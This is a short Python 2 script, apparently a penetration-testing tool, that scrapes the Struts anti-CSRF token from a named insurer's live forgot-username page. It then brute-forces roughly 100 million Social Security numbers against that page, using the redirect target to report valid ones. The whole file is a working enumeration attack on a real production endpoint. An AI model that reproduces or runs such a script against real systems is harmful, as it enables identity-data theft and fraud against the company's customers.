#!/usr/bin/env python

#####################
# defeat anti-csrf tokens
#####################

try:
	import requests
	import lxml.html as lh
	from io import StringIO
except ImportError, e:
	print "Exception: {}".format(str(e))
	exit(1)

def get_token(session, url):
    gr = session.get(url, verify=False)
    tree = lh.fromstring(gr.content)
    token = tree.xpath('//input[@name="org.apache.struts.taglib.html.TOKEN"]/@value')[0]
    return token

def post_ssn(session, url, data):
    pr = session.post(url, data=data, verify=False, allow_redirects=False) 
    try:
        location = pr.headers['Location']
        #if location != 'https://servicestage.northwesternmutual.com/CXID/forgotUserNameFailure.do':
        if location != 'https://service.northwesternmutual.com/CXID/forgotUserNameFailure.do':
            print 'SSN found: %s' %data['taxPayerId']
        else:
            print 'Bad SSN: %s' %data['taxPayerId']
            print pr.status_code, pr.headers['location']
    except:
        print "No 'Location' Header was returned by the server"

def main():
    #url = 'https://servicestage.northwesternmutual.com/CXID/forgotUserNameIdentification.do'
    url = 'https://service.northwesternmutual.com/CXID/forgotUserNameIdentification.do'
    token = str()
    #proxies = { 'https': 'http://172.21.22.204:8080' }	#for testing

    # establish session
    s = requests.Session()

    if not token:
        token = get_token(s, url)

    for i in xrange(342356633, 444444444):
        data = {'org.apache.struts.taglib.html.TOKEN':token,
                'firstName':'matt',
                'lastName':'lange',
                'clientDOB':'1%2F1%2F2000',
                'taxPayerId':str(i),
                'emailAddress':'matt%40matt.com'}
        post_ssn(s, url, data) 

if __name__ == '__main__':
    main()
